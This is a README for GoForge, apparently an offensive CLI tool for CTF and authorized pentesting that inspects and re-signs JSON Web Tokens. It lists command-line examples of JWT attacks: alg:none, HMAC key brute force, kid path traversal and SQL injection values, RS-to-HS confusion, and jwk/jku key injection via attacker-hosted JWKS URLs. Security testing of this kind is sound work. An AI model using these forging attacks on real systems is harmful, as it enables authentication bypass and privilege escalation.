# GoForge ⚒

A CLI tool to **reforge JWTs**, for CTF challenges and authorized pentesting.
It decodes, inspects and re-signs JSON Web Tokens, and implements the classic
attacks on the algorithm and the header.

> ⚠️ Use only on targets you are **authorized** to test (CTF, lab, pentest
> engagement with a defined scope).

## Build

```bash
go build -o goforge .
./goforge --help
```

During development: `go run . <flags>`.

## Usage

The token is passed via `--token`/`-t` (or as a positional argument), either as a
raw string or from a file using the `@` prefix:

```bash
goforge --token eyJhbGci...        # string
goforge --token @token.txt         # file (trailing newline is stripped)
goforge eyJhbGci...                # positional (fallback)
```

### Inspect a token

```bash
goforge -a --token eyJhbGci...     # exploded view: header / payload / signature
```

### Modify fields

`--set field=value` is **repeatable**. The value is parsed as JSON
(`true` -> bool, `123` -> number, otherwise string):

```bash
goforge --key secret --set admin=true --set role=root --token eyJ...
```

### Attacks

| Attack | Flag | Example |
|--------|------|---------|
| HMAC (known key) | `--key` / `-k` | `--key secret` or `--key @key.txt` |
| HMAC bruteforce | `--wordlist` / `-w` | `--wordlist rockyou.txt` |
| `alg:none` (+ case variants) | `--none` | `--none --set admin=true` |
| `kid` injection | `--kid` | `--kid "../../../../dev/null"` (empty key) |
| RS->HS confusion | `--confusion`/`-c` + `--public-key`/`-pk` | `--confusion -pk pub.pem` |
| embedded `jwk` | `--jwk` | `--jwk --set admin=true` |
| hosted `jku` | `--jku` | `--jku https://evil/jwks.json` |

Examples:

```bash
# Key found by bruteforce, then forge
goforge --wordlist rockyou.txt --set admin=true --token eyJ...

# alg:none (emits none/None/NONE/nOnE)
goforge --none --set user=admin --token eyJ...

# kid -> /dev/null (empty key), SQLi (injected key)
goforge --kid "../../../../dev/null" --set admin=true --token eyJ...
goforge --kid "x' UNION SELECT 'x'-- -" --key x --set admin=true --token eyJ...

# Confusion: the server verifies RS256 with its public key -> we sign HS256 with it
goforge --confusion --public-key server_pub.pem --set admin=true --token eyJ...

# jku: outputs the token + the JWKS to host at the URL
goforge --jku https://attacker.tld/jwks.json --set admin=true --token eyJ...
```

### Interactive mode

Without an attack flag, `-i` opens a guided interface (arrow-key menu):

```bash
goforge -i
```
It reads the token, detects the algorithm, shows the attack menu, lets you modify
fields, then asks for the inputs specific to the chosen attack. It also includes
an *analyse* option.

## Supported algorithms (HMAC signing)

`HS256`, `HS384`, `HS512` (picked automatically from the token). Asymmetric
tokens (`RS*`, `ES*`, `PS*`) are handled by the confusion / `jwk` / `jku` attacks.

## Architecture

```
main.go          CLI: flags, orchestration, output
interactive.go   interactive mode (survey)
internal/
  jwt/           primitives: Parse, Encode, SignHMAC, SignRSA, PublicKeyToJWK
  attack/        BruteforceKey (parallel HMAC bruteforce)
  forge/         Options + forging functions (HMAC, None, Kid, Confusion, JWK, JKU)
```
